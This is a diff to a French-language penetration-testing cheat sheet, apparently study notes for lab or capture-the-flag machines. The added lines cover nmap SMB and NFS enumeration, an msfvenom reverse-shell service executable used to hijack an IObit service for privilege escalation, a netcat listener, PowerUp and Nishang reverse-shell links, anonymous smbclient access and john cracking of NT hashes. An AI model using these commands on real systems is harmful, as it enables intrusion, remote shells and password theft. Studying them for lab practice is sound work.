@@ -68,7 +68,10 @@
 
 ##[RECONNAISSANCE ACTICE / ENUMERATION]
 
-    -sudo netdiscover -r 192.168. -i eth0
+    -sudo netdiscover -r 192.168.X.X -8 -i eth0 -S
+        -S pour le syn
+        -R pour le rst
+        -A pour l'ack
     (eliminer les mac vmware workstation)
     
     -ping de l'adresse trouvée pour vérifier si ping up 
@@ -116,6 +119,13 @@
         
     nmap -sV -script http-sql-injection 192.168.x.x
         Scan des injections sql
+
+    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.186.19
+        Scan pour enumerer les partages samba
+
+    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.186.19
+        Enumerer les partages NFS
+        
         
 ##[CRAWLING]    
 
@@ -225,6 +235,7 @@
          https://wargame.braincoke.fr/labs/dvwa/dvwa-file-upload/
          tout les content type : https://inkplant.com/code/content-type-headers
 
+
         
 
 #[SHELL / REVERSE SHELL]
@@ -232,6 +243,14 @@
     https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
     https://github.com/flozz/p0wny-shell
     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+    Création de payload MSFVenom
+      msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+        ASCService.exe est le nom de l'exe qu'on va remplacer du service ASCService
+        sc stop AdvancedSystemCareService9
+        copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+        nc -lvnp 4443 sur kali
+        sc start AdvancedSystemCareService9 sur le shell
 
     nc -lnvp 4444
       -l pour démarrer l’écoute des connexions TCP
@@ -300,11 +319,20 @@
          PrivEscCheck : 
            https://github.com/itm4n/PrivescCheck
          
-        WES-NG: Windows Exploit Suggester
+          WES-NG: Windows Exploit Suggester
             https://github.com/bitsadmin/wesng
 
-      MSF exploit suggester:
-          multi/recon/local_exploit_suggester
+          MSF exploit suggester:
+            multi/recon/local_exploit_suggester
+
+          Powershell script PowerUp 
+            https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+            . .\PowerUp.ps1
+            Invoke-AllChecks
+
+          NISHANG
+            https://github.com/samratashok/nishang
+            reverse shell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
         
 
 #[EXPLOITATION WINDOWS]
@@ -415,9 +443,24 @@
               wmic product get name,version,vendor
             Rechercher exploit sur exploit-db ou google
 
+    Se connecter à un partage samba :
+          smbclient //10.10.186.19/anonymous
+
+#[CRACKING MOT DE PASSE]
+
+    Cracket hash de mot de passe windows
+            john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+            
     
             
            
+#[WORDLISTS]
+
+    Mterpreter commands :
+            https://www.tntsecurite.ca/wp-content/uploads/2017/08/Commandes-Metasploits-Meterpreter.pdf
+
+
+            
 #[WORDLISTS]
 
     apt -y install seclists (https://github.com/danielmiessler/SecLists)
